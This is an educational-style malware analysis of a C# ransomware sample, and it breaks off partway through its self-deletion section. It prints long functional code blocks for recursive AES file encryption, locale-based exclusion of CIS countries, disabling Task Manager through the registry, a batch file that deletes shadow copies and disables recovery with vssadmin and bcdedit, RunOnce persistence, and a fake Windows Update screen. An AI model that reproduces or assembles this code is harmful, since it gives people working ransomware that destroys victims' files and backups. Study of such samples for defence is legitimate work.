# 🕵️‍♂️ Analyzing a Malicious C# Ransomware Code: A Deep Dive 🕵️‍♂️

This article dissects a C# ransomware program designed to encrypt files, disrupt system operations, and evade detection. The code employs sophisticated techniques such as AES and RSA encryption, registry manipulation, and self-deletion to maximize its impact. Below, we analyze its key components, illustrating each point with the relevant code snippets. The goal is to understand its malicious behavior and highlight the importance of cybersecurity vigilance.

**Note**: This code is harmful and should only be studied in a controlled, isolated environment. Do not execute it on any system.

---

## 🚀 Overview of the Ransomware

The ransomware is implemented as a Windows Forms application (`Form1` class) that masquerades as a legitimate Windows Update process. It encrypts files on local and network drives, disables system recovery mechanisms, and demands a ransom by leaving a `README` file with instructions. Key features include:

- **File Encryption**: Uses AES for file encryption and RSA for key encryption.
- **System Disruption**: Disables Task Manager and deletes Volume Shadow Copies.
- **Persistence**: Sets up autorun via the Windows Registry.
- **Self-Destruction**: Deletes itself to evade detection.
- **Geographical Targeting**: Exits if the system’s culture is in specific regions (e.g., Russia, Ukraine).

Let’s break down the critical components with full code snippets for clarity.

---

## 🌟 1. Initial Setup and Evasion Techniques

### Description
The ransomware initializes critical variables and checks for duplicate instances to avoid running multiple times. It also verifies the system’s culture to exclude certain regions, likely to avoid targeting specific countries.

### Code
```csharp
public Form1()
{
    Class3.QNpOt4wzFfcSE();
    driveInfo_0 = DriveInfo.GetDrives();
    string_0 = RandomRansom(7);
    string_1 = Environment.MachineName.ToString();
    string_2 = Environment.UserName;
    string_3 = Guid.NewGuid().ToString();
    string_5 = "blut4";
    dateTime_0 = DateTime.Now;
    string_9 = Path.GetTempPath() + "backup//";
    string_10 = new string[72]
    {
        ".mdf", ".db", ".mdb", ".sql", ".pdb", ".pdb", ".pdb", ".dsk", ".fp3", ".fdb",
        // ... other database file extensions
    };
    OqFbaNcXs = true;
    ((Form)this)._002Ector();
    InitializeComponent();
}

private void Form1_Load(object sender, EventArgs e)
{
    string processName = Process.GetCurrentProcess().ProcessName;
    int num = 0;
    Process[] processes = Process.GetProcesses();
    Process[] array = processes;
    foreach (Process process in array)
    {
        if (!process.ProcessName.Contains(processName))
        {
            continue;
        }
        num++;
        if (num > 1)
        {
            try
            {
                Environment.Exit(0);
                ((Form)this).Close();
                Application.Exit();
            }
            catch
            {
            }
        }
    }
    ((Control)this).BackColor = ColorTranslator.FromHtml("#07466c");
    updating();
    Thread thread = new Thread(method_1);
    thread.Start();
}

public void go()
{
    string[] source = new string[6] { "ru", "uk", "kk", "ky", "hy", "ka" };
    string text = method_2();
    string value = TruncateLongString(text, 2);
    if (source.Contains(value))
    {
        SelfDelete();
        Environment.Exit(0);
        ((Form)this).Close();
        Application.Exit();
    }
    // ... rest of the go() method
}

private string method_2()
{
    return CultureInfo.CurrentCulture.Name;
}
```

### Analysis
- **Initialization**: The constructor sets up variables like a random ID (`string_0`), machine name (`string_1`), username (`string_2`), and a list of database file extensions (`string_10`) to target.
- **Single Instance Check**: In `Form1_Load`, it ensures only one instance runs by checking for processes with the same name, exiting if duplicates are found.
- **Geographical Evasion**: The `go` method checks the system’s culture (e.g., `ru-RU` for Russia) and exits if it matches predefined regions, likely to avoid legal repercussions in those areas.

---

## 🔒 2. File Encryption Mechanism

### Description
The ransomware encrypts files using AES (for files) and RSA (for the encryption key). It targets files on local and network drives, excluding system directories, and renames encrypted files with Base64-encoded names.

### Code
```csharp
public void lockdir(string location, string password, string[] words)
{
    string[] files = Directory.GetFiles(location);
    string[] directories = Directory.GetDirectories(location);
    if (location.Contains("WINDOWS") || location.Contains("RECYCLER") || location.Contains("Program Files") || location.Contains("Program Files (x86)") || location.Contains("Windows") || location.Contains("Recycle.Bin") || location.Contains("RECYCLE.BIN") || location.Contains("Recycler") || location.Contains("TEMP") || location.Contains("APPDATA") || location.Contains("AppData") || location.Contains("Temp") || location.Contains("ProgramData") || location.Contains("Microsoft") || location.Contains("Burn"))
    {
        return;
    }
    for (int i = 0; i < files.Length; i++)
    {
        try
        {
            string extension = Path.GetExtension(files[i]);
            string text = null;
            using (FileStream fileStream = File.Open(files[i], FileMode.Open, FileAccess.Read))
            {
                byte[] array = new byte[10];
                fileStream.Position = fileStream.Length - array.Length;
                fileStream.Read(array, 0, array.Length);
                text = encoding_0.GetString(array);
            }
            if (words.Contains(extension) || files[i].Contains("README_"))
            {
                continue;
            }
            if (text.Contains("###"))
            {
                string value = text.Replace("###", "");
                try
                {
                    Convert.ToInt32(value);
                }
                catch (Exception)
                {
                    LockFile(files[i], password);
                }
            }
            else
            {
                LockFile(files[i], password);
            }
        }
        catch (UnauthorizedAccessException)
        {
        }
        catch (Exception)
        {
        }
    }
    for (int j = 0; j < directories.Length; j++)
    {
        try
        {
            lockdir(directories[j], password, words);
            WriteInfo(directories[j], password);
        }
        catch (UnauthorizedAccessException)
        {
        }
        catch (Exception)
        {
        }
    }
}

public void LockFile(string file, string password)
{
    method_5();
    FileInfo fileInfo = new FileInfo(file);
    long length = fileInfo.Length;
    string extension = Path.GetExtension(file);
    if (length >= 1048576L && !string_10.Contains(extension))
    {
        AES_Encrypt(file, password);
        return;
    }
    byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
    byte[] bytes = Encoding.UTF8.GetBytes(password);
    bytes = SHA256.Create().ComputeHash(bytes);
    byte[] bytes2 = AES_Encrypt2(bytesToBeEncrypted, bytes);
    File.WriteAllBytes(file, bytes2);
    string_4 = Path.GetFileName(file);
    byte[] bytes3 = Encoding.UTF8.GetBytes(string_4);
    string text = Convert.ToBase64String(bytes3);
    string directoryName = fileInfo.DirectoryName;
    byte[] bytes4 = Encoding.Default.GetBytes("###" + string_0);
    using (FileStream fileStream = new FileStream(file, FileMode.Append, FileAccess.Write))
    {
        fileStream.Write(bytes4, 0, bytes4.Length);
        fileStream.Flush();
        fileStream.Close();
    }
    File.Move(file, directoryName + "/" + text);
}

public byte[] AES_Encrypt2(byte[] bytesToBeEncrypted, byte[] passwordBytes)
{
    byte[] array = null;
    byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
    using MemoryStream memoryStream = new MemoryStream();
    using RijndaelManaged rijndaelManaged = new RijndaelManaged();
    rijndaelManaged.KeySize = 256;
    rijndaelManaged.BlockSize = 128;
    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
    rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
    rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
    rijndaelManaged.Mode = CipherMode.CBC;
    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
    {
        cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
        cryptoStream.Close();
    }
    return memoryStream.ToArray();
}
```

### Analysis
- **Directory Traversal**: The `lockdir` method recursively scans directories, skipping system folders like `WINDOWS` or `Program Files` to avoid detection.
- **File Selection**: It targets files not already encrypted (marked with `###`) and excludes specific extensions (e.g., `.lnk`) or `README_` files.
- **Encryption Strategy**:
  - Small files (<1MB) are fully encrypted using `AES_Encrypt2`.
  - Larger files are partially encrypted (first 1MB) using `AES_Encrypt` to save time.
  - The AES key is derived from a SHA256-hashed password.
- **File Renaming**: Encrypted files are renamed to their Base64-encoded original names, and a marker (`###` + random ID) is appended.

---

## 🛡️ 3. System Disruption and Persistence

### Description
The ransomware disables Task Manager, deletes Volume Shadow Copies, and sets up autorun to ensure persistence. It also creates a fake Windows Update UI to deceive users.

### Code
```csharp
public void KillCtrlAltDelete()
{
    string value = "1";
    string subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    try
    {
        RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(subkey);
        registryKey.SetValue("DisableTaskMgr", value);
        registryKey.Close();
    }
    catch (Exception)
    {
    }
}

public void DelBack()
{
    WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
    bool flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
    string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "delback.bat");
    string contents = "vssadmin delete shadows /all /quiet & bcdedit.exe /set {default} recoveryenabled no & bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures";
    File.WriteAllText(text, contents, Encoding.Default);
    ProcessStartInfo processStartInfo = new ProcessStartInfo();
    processStartInfo.Verb = "runas";
    processStartInfo.FileName = text;
    if (!flag)
    {
        try
        {
            Process.Start(processStartInfo);
            return;
        }
        catch (Win32Exception)
        {
            return;
        }
    }
    try
    {
        Process.Start(processStartInfo);
    }
    catch (Win32Exception)
    {
    }
}

public void Autorun()
{
    string text = Path.GetTempPath() + "Adobe//";
    try
    {
        if (!Directory.Exists(string_9))
        {
            DirectoryInfo directoryInfo = Directory.CreateDirectory(text);
            directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
        }
    }
    catch
    {
    }
    string location = Assembly.GetExecutingAssembly().Location;
    string fileName = Path.GetFileName(location);
    try
    {
        File.Copy(location, Path.Combine(text, fileName), overwrite: false);
    }
    catch
    {
    }
    RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\");
    string text2 = Path.GetTempPath() + "Adobe";
    registryKey.SetValue(fileName, text2 + "\\" + fileName);
    registryKey.Close();
}

public void updating()
{
    _003C_003Ec__DisplayClass2 CS_0024_003C_003E8__locals7 = new _003C_003Ec__DisplayClass2();
    CS_0024_003C_003E8__locals7._003C_003E4__this = this;
    CS_0024_003C_003E8__locals7.timeinstall = 1;
    ((Control)label1).Text = "Configuring critical Windows Updates" + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + CS_0024_003C_003E8__locals7.timeinstall + "% complete" + Environment.NewLine + "Do not turn off your computer.";
    Timer val = new Timer();
    val.Interval = 100000;
    Timer val2 = val;
    val2.Tick += delegate
    {
        CS_0024_003C_003E8__locals7.timeinstall++;
        if (CS_0024_003C_003E8__locals7.timeinstall < 100)
        {
            ((Control)CS_0024_003C_003E8__locals7._003C_003E4__this.label1).Text = "Configuring critical Windows Updates" + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + CS_0024_003C_003E8__locals7.timeinstall + "% complete" + Environment.NewLine + "Do not turn off your computer.";
        }
    };
    val2.Start();
}
```

### Analysis
- **Task Manager Disable**: `KillCtrlAltDelete` sets a registry key to disable Task Manager, preventing users from terminating the process.
- **Backup Deletion**: `DelBack` creates a batch file to delete Volume Shadow Copies (`vssadmin`) and disable recovery options (`bcdedit`), making file restoration difficult.
- **Autorun**: `Autorun` copies the executable to a hidden `Adobe` folder in the temp directory and adds it to the `RunOnce` registry key for persistence.
- **Fake UI**: `updating` displays a deceptive Windows Update screen with a progress bar, discouraging users from interrupting the process.

---

## 🗑️ 4. Self-Deletion and Cleanup

### Description
To evade detection, the ransomware deletes its executable and removes its autorun entries after completing its tasks.

### Code
```csharp
public void SelfDelete()
{
    string executablePath = App
```